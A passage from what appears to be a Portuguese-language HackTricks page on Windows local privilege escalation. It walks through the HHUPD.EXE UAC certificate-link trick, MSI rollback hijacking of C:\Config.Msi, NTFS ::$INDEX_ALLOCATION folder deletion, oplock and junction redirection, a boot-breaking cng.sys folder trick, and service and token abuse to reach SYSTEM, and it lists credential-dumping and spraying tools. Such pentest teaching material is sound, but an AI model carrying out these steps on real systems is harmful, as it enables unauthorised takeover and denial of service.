Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Para explorar esta vulnerabilidade, é necessário executar os seguintes passos:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

Leia isto para **aprender sobre Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Depois **leia isto para aprender sobre UAC e UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

A técnica descrita [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) com um código de exploit [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

O ataque basicamente consiste em abusar da funcionalidade de rollback do Windows Installer para substituir arquivos legítimos por maliciosos durante o processo de desinstalação. Para isso o atacante precisa criar um **malicious MSI installer** que será usado para sequestrar a pasta `C:\Config.Msi`, a qual será usada pelo Windows Installer para armazenar arquivos de rollback durante a desinstalação de outros pacotes MSI, onde os arquivos de rollback teriam sido modificados para conter a payload maliciosa.

A técnica resumida é a seguinte:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Crie um `.msi` que instala um arquivo inofensivo (por exemplo, `dummy.txt`) em uma pasta gravável (`TARGETDIR`).
- Marque o instalador como **"UAC Compliant"**, para que um **usuário não-admin** possa executá-lo.
- Mantenha um **handle** aberto para o arquivo após a instalação.

- Step 2: Begin Uninstall
- Desinstale o mesmo `.msi`.
- O processo de uninstall começa a mover arquivos para `C:\Config.Msi` e renomeá-los para arquivos `.rbf` (backups de rollback).
- **Poll the open file handle** usando `GetFinalPathNameByHandle` para detectar quando o arquivo se torna `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- O `.msi` inclui uma **custom uninstall action (`SyncOnRbfWritten`)** que:
- Sinaliza quando o `.rbf` foi escrito.
- Depois **aguarda** outro evento antes de continuar o uninstall.

- Step 4: Block Deletion of `.rbf`
- Quando sinalizado, **abra o arquivo `.rbf`** sem `FILE_SHARE_DELETE` — isso **impede que ele seja deletado**.
- Em seguida **sinalize de volta** para que o uninstall possa terminar.
- O Windows Installer falha ao deletar o `.rbf`, e como não consegue deletar todo o conteúdo, **`C:\Config.Msi` não é removido**.

- Step 5: Manually Delete `.rbf`
- Você (atacante) deleta o arquivo `.rbf` manualmente.
- Agora **`C:\Config.Msi` está vazio**, pronto para ser sequestrado.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recrie a pasta `C:\Config.Msi` você mesmo.
- Defina **weak DACLs** (por exemplo, Everyone:F), e **mantenha um handle aberto** com `WRITE_DAC`.

- Step 7: Run Another Install
- Instale o `.msi` novamente, com:
- `TARGETDIR`: localização gravável.
- `ERROROUT`: uma variável que força uma falha.
- Esta instalação será usada para acionar o **rollback** novamente, que lê `.rbs` e `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` para monitorar `C:\Config.Msi` até que um novo `.rbs` apareça.
- Capture o nome do arquivo.

- Step 9: Sync Before Rollback
- O `.msi` contém uma **custom install action (`SyncBeforeRollback`)** que:
- Sinaliza um evento quando o `.rbs` é criado.
- Então **aguarda** antes de continuar.

- Step 10: Reapply Weak ACL
- Após receber o evento `.rbs created`:
- O Windows Installer **reaplica ACLs fortes** a `C:\Config.Msi`.
- Mas como você ainda tem um handle com `WRITE_DAC`, você pode **reaplicar ACLs fracas** novamente.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Sobrescreva o arquivo `.rbs` com um **fake rollback script** que instrui o Windows a:
- Restaurar seu arquivo `.rbf` (DLL maliciosa) em um **local privilegiado** (por exemplo, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Colocar seu fake `.rbf` contendo uma **DLL payload maliciosa em nível SYSTEM**.

- Step 12: Trigger the Rollback
- Sinalize o evento de sync para que o instalador retome.
- Uma **type 19 custom action (`ErrorOut`)** é configurada para **intencionalmente falhar a instalação** em um ponto conhecido.
- Isso causa o **início do rollback**.

- Step 13: SYSTEM Installs Your DLL
- O Windows Installer:
- Lê seu `.rbs` malicioso.
- Copia sua DLL `.rbf` para o local alvo.
- Você agora tem sua **DLL maliciosa em um path carregado pelo SYSTEM**.

- Final Step: Execute SYSTEM Code
- Execute um binário confiável **auto-elevated** (por exemplo, `osk.exe`) que carrega a DLL que você hijackou.
- **Boom**: seu código é executado **como SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

A técnica principal de rollback do MSI (a anterior) assume que você pode deletar uma **pasta inteira** (por exemplo, `C:\Config.Msi`). Mas e se sua vulnerabilidade só permite **deleção arbitrária de arquivo**?

Você poderia explorar **internals do NTFS**: toda pasta tem um stream de dados alternativo oculto chamado:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Este stream armazena os **metadados de índice** da pasta.

Portanto, se você **excluir o `::$INDEX_ALLOCATION` stream** de uma pasta, o NTFS **remove a pasta inteira** do sistema de arquivos.

Você pode fazer isso usando APIs padrão de exclusão de arquivos como:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Mesmo que você esteja chamando uma API de exclusão de *arquivo*, ela **deleta a própria pasta**.

### De Folder Contents Delete para SYSTEM EoP
E se sua primitiva não permitir que você exclua arquivos/pastas arbitrários, mas ela **permite a exclusão do *conteúdo* de uma attacker-controlled folder**?

1. Passo 1: Configure uma pasta e um arquivo isca
- Crie: `C:\temp\folder1`
- Dentro dela: `C:\temp\folder1\file1.txt`

2. Passo 2: Coloque um **oplock** em `file1.txt`
- O oplock **pausa a execução** quando um processo privilegiado tenta excluir `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Passo 3: Acionar o processo SYSTEM (por exemplo, `SilentCleanup`)
- Este processo varre pastas (por exemplo, `%TEMP%`) e tenta apagar o conteúdo delas.
- Quando alcançar `file1.txt`, o **oplock triggers** e entrega o controle para seu callback.

4. Passo 4: Dentro do oplock callback – redirecionar a exclusão

- Opção A: Mover `file1.txt` para outro local
- Isso esvazia `folder1` sem quebrar o oplock.
- Não delete `file1.txt` diretamente — isso liberaria o oplock prematuramente.

- Opção B: Converter `folder1` em uma **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opção C: Criar um **symlink** em `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Isso mira o stream interno do NTFS que armazena os metadados da pasta — excluí-lo exclui a pasta.

5. Passo 5: Liberar o oplock
- O processo SYSTEM continua e tenta excluir `file1.txt`.
- Mas agora, devido à junction + symlink, na verdade está excluindo:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultado**: `C:\Config.Msi` é deletado pelo SYSTEM.

### De criação arbitrária de pasta para DoS permanente

Exploitar uma primitiva que permite que você **crie uma pasta arbitrária como SYSTEM/admin** — mesmo que **você não possa escrever arquivos** ou **definir permissões fracas**.

Crie uma **pasta** (não um arquivo) com o nome de um **driver crítico do Windows**, e.g.:
```
C:\Windows\System32\cng.sys
```
- Este caminho normalmente corresponde ao driver em modo kernel `cng.sys`.
- Se você **pré-criá-lo como uma pasta**, o Windows falha ao carregar o driver real na inicialização.
- Então, o Windows tenta carregar `cng.sys` durante o boot.
- Ele vê a pasta, **não consegue resolver o driver real**, e **trava ou interrompe a inicialização**.
- Não há **mecanismo de fallback**, e **nenhuma recuperação** sem intervenção externa (por exemplo, reparo de boot ou acesso ao disco).


## **De High Integrity para SYSTEM**

### **Novo serviço**

Se você já está executando em um processo High Integrity, o **caminho para SYSTEM** pode ser simples apenas **criando e executando um novo serviço**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Ao criar um binário de serviço, certifique-se de que é um serviço válido ou que o binário realiza as ações necessárias rapidamente, pois será encerrado em 20s se não for um serviço válido.

### AlwaysInstallElevated

A partir de um processo de alta integridade você pode tentar **habilitar as entradas de registro AlwaysInstallElevated** e **instalar** um reverse shell usando um _**.msi**_ wrapper.\
[Mais informações sobre as chaves de registro envolvidas e como instalar um pacote _.msi_ aqui.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Você pode** [**encontrar o código aqui**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Se você tiver esses privilégios de token (provavelmente encontrará isso em um processo já de alta integridade), será capaz de **abrir quase qualquer processo** (não processos protegidos) com o privilégio SeDebug, **copiar o token** do processo e criar um **processo arbitrário com esse token**.\
Ao usar esta técnica geralmente se **seleciona qualquer processo executando como SYSTEM com todos os privilégios de token** (_sim, você pode encontrar processos SYSTEM sem todos os privilégios de token_).\
**Você pode encontrar um** [**exemplo de código executando a técnica proposta aqui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Esta técnica é usada pelo meterpreter para escalar em `getsystem`. A técnica consiste em **criar um pipe e então criar/abusar um serviço para escrever nesse pipe**. Depois, o **servidor** que criou o pipe usando o privilégio **`SeImpersonate`** poderá **impersonar o token** do cliente do pipe (o serviço) obtendo privilégios SYSTEM.\
Se você quiser [**aprender mais sobre named pipes deve ler isto**](#named-pipe-client-impersonation).\
Se quiser ler um exemplo de [**como ir de high integrity para System usando named pipes você deve ler isto**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se você conseguir **hijackar uma dll** que está sendo **carregada** por um **processo** executando como **SYSTEM**, você poderá executar código arbitrário com essas permissões. Portanto, Dll Hijacking também é útil para esse tipo de escalada de privilégios e, além disso, é muito **mais fácil de alcançar a partir de um processo de alta integridade**, já que ele terá **permissões de escrita** nas pastas usadas para carregar dlls.\
**Você pode** [**aprender mais sobre Dll hijacking aqui**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Leia:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Mais ajuda

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Ferramentas úteis

**Melhor ferramenta para procurar vetores de escalada de privilégio local no Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Verifica misconfigurações e arquivos sensíveis (**[**veja aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Verifica algumas possíveis misconfigurações e coleta informações (**[**veja aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Verifica misconfigurações**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrai informações de sessões salvas do PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Use -Thorough localmente.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrai credenciais do Credential Manager. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Faz spray com senhas coletadas pelo domínio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh é um spoofer ADIDNS/LLMNR/mDNS/NBNS em PowerShell e uma ferramenta man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeração básica de privesc no Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Procura por vulnerabilidades de privesc conhecidas (DEPRECATED para Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Verificações locais **(Necessita privilégios Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Procura por vulnerabilidades conhecidas de privesc (precisa ser compilado usando VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera o host procurando por misconfigurações (mais uma ferramenta de coleta de informações do que privesc) (precisa ser compilado) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrai credenciais de vários softwares (exe pré-compilado no github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Porta do PowerUp para C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Verifica misconfigurações (executável pré-compilado no github). Não recomendado. Não funciona bem no Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Verifica possíveis misconfigurações (exe a partir de python). Não recomendado. Não funciona bem no Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Ferramenta criada com base neste post (não necessita de accesschk para funcionar corretamente, mas pode usá-lo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lê a saída de **systeminfo** e recomenda exploits funcionais (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lê a saída de **systeminfo** e recomenda exploits funcionais (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Você tem que compilar o projeto usando a versão correta do .NET ([veja isto](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver a versão do .NET instalada no host vítima você pode fazer:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referências

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
